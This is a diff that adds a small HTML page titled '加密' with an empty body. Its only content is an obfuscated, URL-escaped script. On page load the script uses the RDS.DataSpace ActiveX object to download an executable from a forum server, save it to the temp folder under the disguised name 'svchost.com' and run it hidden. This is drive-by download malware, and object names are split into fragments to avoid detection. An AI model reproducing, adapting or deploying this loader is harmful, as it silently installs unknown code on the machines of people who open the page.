@@ -1,0 +1,9 @@
+<HTML>
+<HEAD>
+<META http-eqiv="content-type" content="text/html;charset=gb2312"> 
+<title>加密</title> 
+<script LANGUAGE="Javascript">document.write(unescape("%3Cscript%20language%3D%22VBScript%22%3E%0D%0Ai%3D1%0D%0A%20%20%20%20Set%20doccre%20%3D%20document.createElement%28%22ob%22%26%22ject%22%29%0D%0Ai%3D1%0D%0Adoccre.setAttribute%20%22cla%22%26%22ssid%22%2C%20%22clsid%3ABD%22%26%2296C556-%22%26%2265A3-11D0-%22%26%22983A-0%22%26%220C04FC29E36%22%0D%0Ai%3D1%0D%0A%20%20%20%20set%20Fsos%20%3D%20doccre.createobject%28%22Ado%22%26%22db.S%22%26%22tre%22%26%22am%22%2C%22%22%29%0D%0Ai%3D1%0D%0A%20%20%20%20Fsos.open%0D%0Ai%3D1%0D%0A%20%20%20%20Fsos.type%20%3D%201%0D%0Ai%3D1%0D%0A%20%20%09%20%20Set%20xmldown%20%3D%20doccre.CreateObject%28%22Micros%22%26%22oft.XM%22%26%22LHTTP%22%2C%22%22%29%0D%0Ai%3D1%0D%0A%20%20%20%20xmldown.Open%20%22G%22%26%22E%22%26%22T%22%2C%20%22http%3A//www.netcheers.com/discuz/forumdata/68.exe%22%2C%20False%0D%0Ai%3D1%0D%0A%20xmldown.Send%0D%0Ai%3D1%0D%0A%20%20set%20Files1%20%3D%20doccre.createobject%28%22Scripting.FileSyst%22%26%22emObject%22%2C%22%22%29%0D%0Ai%3D1%0D%0Aset%20temp%20%3D%20Files1.GetSpecialFolder%282%29%20%0D%0Ai%3D1%0D%0A%20%20%20%20Fsos.write%20xmldown.responseBody%0D%0Ai%3D1%0D%0A%20%20%20%20Fsos.savetofile%20Files1.BuildPath%28temp%2C%22svcho%22%26%22st.com%22%29%2C2%0D%0Ai%3D1%0D%0A%20%20%20%20Fsos.close%0D%0Ai%3D1%0D%0A%20%20%20%20set%20execs%20%3D%20doccre.createobject%28%22Shel%22%26%22l.App%22%26%22lica%22%26%22tion%22%2C%22%22%29%0D%0Ai%3D1%0D%0A%20%20%20%20execs.ShellExecute%20Files1.BuildPath%28temp%2C%22svch%22%26%22ost.com%22%29%2C%22%22%2C%22%22%2C%22op%22%26%22en%22%2C0%0D%0Ai%3D1%0D%0A%20%20%20%20%3C/script%3E"))</SCRIPT>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
